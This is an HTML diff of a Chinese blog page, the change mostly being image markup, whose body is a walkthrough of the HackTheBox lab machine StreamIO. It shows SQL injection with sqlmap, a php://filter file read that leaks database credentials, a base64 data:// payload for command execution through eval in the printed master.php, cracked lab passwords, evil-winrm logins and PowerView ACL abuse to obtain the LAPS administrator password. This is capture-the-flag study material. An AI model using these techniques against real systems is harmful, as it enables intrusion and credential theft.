@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;474 10.10.11.158   端口扫描windows 域机器： 123456789101112131415161718192021222324252627282930313233343536373839404142434445$ nmap -sC -sV 10.10.11.158St">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;474 10.10.11.158                                                                                                              端口扫描windows 域机器： 123">
 <meta property="og:type" content="article">
 <meta property="og:title" content="StreamIO - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/06/14/StreamIO-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;474 10.10.11.158   端口扫描windows 域机器： 123456789101112131415161718192021222324252627282930313233343536373839404142434445$ nmap -sC -sV 10.10.11.158St">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;474 10.10.11.158                                                                                                              端口扫描windows 域机器： 123">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022061301.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022061302.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022061303.jpg">
@@ -132,7 +132,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -221,53 +221,141 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/474" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/474</a></li>
 <li>10.10.11.158</li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061301.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>windows 域机器：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.158</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 15:35 CST</span><br><span class="line">Nmap scan report for 10.10.11.158</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 987 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-13 14:37:27Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">| ssl-cert: Subject: commonName=streamIO/countryName=EU</span><br><span class="line">| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span><br><span class="line">| Not valid before: 2022-02-22T07:03:28</span><br><span class="line">|_Not valid after:  2022-03-24T07:03:28</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_ssl-date: 2022-06-13T14:38:21+00:00; +7h00m01s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2022-06-13T14:37:43</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 160.82 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>直接访问是IIS默认页面：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061302.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="443-watch-streamIO-htb"><a href="#443-watch-streamIO-htb" class="headerlink" title="443 watch.streamIO.htb"></a>443 watch.streamIO.htb</h2><p>证书里可以得到域名，加hosts后访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.158 watch.streamIO.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061303.jpg" alt=""></p>
-<h2 id="443-streamIO-htb"><a href="#443-streamIO-htb" class="headerlink" title="443 streamIO.htb"></a>443 streamIO.htb</h2><p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061304.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061303.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="443-streamIO-htb"><a href="#443-streamIO-htb" class="headerlink" title="443 streamIO.htb"></a>443 streamIO.htb</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061304.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="streamIO-htb"><a href="#streamIO-htb" class="headerlink" title="streamIO.htb"></a>streamIO.htb</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p> login存在注入,很费时间，最终得到hash，破解出来密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r login.txt --force-ssl</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 密码包括最后那两个点</span></span><br><span class="line">yoshihide : 66boysandgirls..</span><br></pre></td></tr></table></figure>
 
 <h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>admin中本身有几个功能,fuzz参数可以发现debug：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061305.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061305.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?user&#x3D;</span><br><span class="line">https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?staff&#x3D;</span><br><span class="line">https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?movie&#x3D;</span><br><span class="line">https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?message&#x3D;</span><br><span class="line"></span><br><span class="line">SecLists&#x2F;Fuzzing&#x2F;fuzz-Bo0oM.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061306.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061306.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>debug那里可以使用php伪协议：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061307.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061307.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?debug&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line"></span><br><span class="line">$connection &#x3D; array(&quot;Database&quot;&#x3D;&gt;&quot;STREAMIO&quot;, &quot;UID&quot; &#x3D;&gt; &quot;db_admin&quot;, &quot;PWD&quot; &#x3D;&gt; &#39;B1@hx31234567890&#39;);</span><br></pre></td></tr></table></figure>
 
 <h2 id="master"><a href="#master" class="headerlink" title="master"></a>master</h2><p>继续进行fuzz可以发现master.php,发现其中调用eval,根据代码分析构造请求，RCE:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7</span><br><span class="line">system($_GET[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?debug&#x3D;master.php&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061308.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061308.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="master-php"><a href="#master-php" class="headerlink" title="master.php"></a>master.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Movie managment&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'included'</span>))</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Only accessable through includes"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'movie_id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$query = <span class="string">"delete from movies where id = "</span>.$_POST[<span class="string">'movie_id'</span>];</span><br><span class="line">$res = sqlsrv_query($handle, $query, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">"Scrollable"</span>=&gt;<span class="string">"buffered"</span>));</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"select * from movies order by movie"</span>;</span><br><span class="line">$res = sqlsrv_query($handle, $query, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">"Scrollable"</span>=&gt;<span class="string">"buffered"</span>));</span><br><span class="line"><span class="keyword">while</span>($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div class="form-control" style="height: 3rem;"&gt;</span><br><span class="line">		&lt;h4 style=<span class="string">"float:left;"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'movie'</span>]; <span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">		&lt;div style=<span class="string">"float:right;padding-right: 25px;"</span>&gt;</span><br><span class="line">			&lt;form method=<span class="string">"POST"</span> action=<span class="string">"?movie="</span>&gt;</span><br><span class="line">				&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"movie_id"</span> value=<span class="string">"&lt;?php echo $row['id']; ?&gt;"</span>&gt;</span><br><span class="line">				&lt;input type="submit" class="btn btn-sm btn-primary" value="Delete"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125; <span class="comment"># while end</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;&lt;hr&gt;&lt;br&gt;</span><br><span class="line">&lt;h1&gt;Staff managment&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'included'</span>))</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Only accessable through includes"</span>);</span><br><span class="line">$query = <span class="string">"select * from users where is_staff = 1 "</span>;</span><br><span class="line">$res = sqlsrv_query($handle, $query, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">"Scrollable"</span>=&gt;<span class="string">"buffered"</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'staff_id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="alert alert-success"&gt; Message sent to administrator&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"select * from users where is_staff = 1"</span>;</span><br><span class="line">$res = sqlsrv_query($handle, $query, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">"Scrollable"</span>=&gt;<span class="string">"buffered"</span>));</span><br><span class="line"><span class="keyword">while</span>($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div class="form-control" style="height: 3rem;"&gt;</span><br><span class="line">		&lt;h4 style=<span class="string">"float:left;"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'username'</span>]; <span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">		&lt;div style=<span class="string">"float:right;padding-right: 25px;"</span>&gt;</span><br><span class="line">			&lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">				&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"staff_id"</span> value=<span class="string">"&lt;?php echo $row['id']; ?&gt;"</span>&gt;</span><br><span class="line">				&lt;input type="submit" class="btn btn-sm btn-primary" value="Delete"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125; <span class="comment"># while end</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;&lt;hr&gt;&lt;br&gt;</span><br><span class="line">&lt;h1&gt;User managment&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'included'</span>))</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Only accessable through includes"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user_id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$query = <span class="string">"delete from users where is_staff = 0 and id = "</span>.$_POST[<span class="string">'user_id'</span>];</span><br><span class="line">$res = sqlsrv_query($handle, $query, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">"Scrollable"</span>=&gt;<span class="string">"buffered"</span>));</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"select * from users where is_staff = 0"</span>;</span><br><span class="line">$res = sqlsrv_query($handle, $query, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">"Scrollable"</span>=&gt;<span class="string">"buffered"</span>));</span><br><span class="line"><span class="keyword">while</span>($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;div class="form-control" style="height: 3rem;"&gt;</span><br><span class="line">		&lt;h4 style=<span class="string">"float:left;"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'username'</span>]; <span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">		&lt;div style=<span class="string">"float:right;padding-right: 25px;"</span>&gt;</span><br><span class="line">			&lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">				&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_id"</span> value=<span class="string">"&lt;?php echo $row['id']; ?&gt;"</span>&gt;</span><br><span class="line">				&lt;input type="submit" class="btn btn-sm btn-primary" value="Delete"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125; <span class="comment"># while end</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;&lt;hr&gt;&lt;br&gt;</span><br><span class="line">&lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"include"</span> hidden&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'include'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'include'</span>] !== <span class="string">"index.php"</span> ) </span><br><span class="line"><span class="keyword">eval</span>(file_get_contents($_POST[<span class="string">'include'</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">" ---- ERROR ---- "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h1><p>可以直接msf生成上线命令，方便后续操作：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061309.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061309.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="portfwd-1433"><a href="#portfwd-1433" class="headerlink" title="portfwd 1433"></a>portfwd 1433</h2><p>前面已经得到数据库账号密码，转发端口：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 1433 -p 1433 -r 127.0.0.1</span><br><span class="line"></span><br><span class="line">$connection &#x3D; array(&quot;Database&quot;&#x3D;&gt;&quot;STREAMIO&quot;, &quot;UID&quot; &#x3D;&gt; &quot;db_admin&quot;, &quot;PWD&quot; &#x3D;&gt; &#39;B1@hx31234567890&#39;);</span><br></pre></td></tr></table></figure>
 
 <h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>数据库可以发现streamio_backup,users表中可以获得nikk37用户密码，这是机器上有的账户：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1,nikk37                                            ,389d14cb8e4e9b94b137deb1caf0612a  </span><br><span class="line"></span><br><span class="line">get_dem_girls2@yahoo.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061310.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061310.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <p>得到的hash直接在线解密，得到明文密码：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061311.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061311.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的账号密码登录，user flag</p>
 <p>需要把stream.htb也加到hosts</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.158 watch.streamIO.htb streamIO.htb stream.htb</span><br><span class="line"></span><br><span class="line">evil-winrm -i stream.htb -u nikk37 -p &quot;get_dem_girls2@yahoo.com&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061312.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061312.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="firefox"><a href="#firefox" class="headerlink" title="firefox"></a>firefox</h2><p>机器上装有firefox，提取登录信息进行解密</p>
 <ul>
 <li>lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwords<br><a href="https://github.com/lclevy/firepwd" target="_blank" rel="noopener">https://github.com/lclevy/firepwd</a></li>
@@ -277,7 +365,14 @@
 <h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>bloodhound收集信息，发现可以从JDgodd打到Administrator</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u nikk37 -ns 10.10.11.158 -d streamio.htb -c All</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061313.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061313.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="core-staff"><a href="#core-staff" class="headerlink" title="core staff"></a>core staff</h2><p>根据bloodhound的信息，JDgodd对core staff有WriteOwner权限，core staff有权限去获取laps密码，所以首先把JDgodd加到core staff组中：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload PowerView.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'JDg0dd1s@d0p3cr3@t0r'</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'streamio\JDgodd'</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line">Add-DomainObjectAcl -Credential <span class="variable">$Cred</span> -TargetIdentity <span class="string">"Core Staff"</span> -principalidentity <span class="string">"streamio\JDgodd"</span></span><br><span class="line">Add-DomainGroupMember -identity <span class="string">"Core Staff"</span> -members <span class="string">"streamio\JDgodd"</span> -credential <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure>
 
@@ -287,7 +382,14 @@
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>得到的laps密码就是Administrator密码,flag在Martin桌面：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i streamio.htb -u Administrator -p 'j50th8dNh2($Ae'</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061314.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
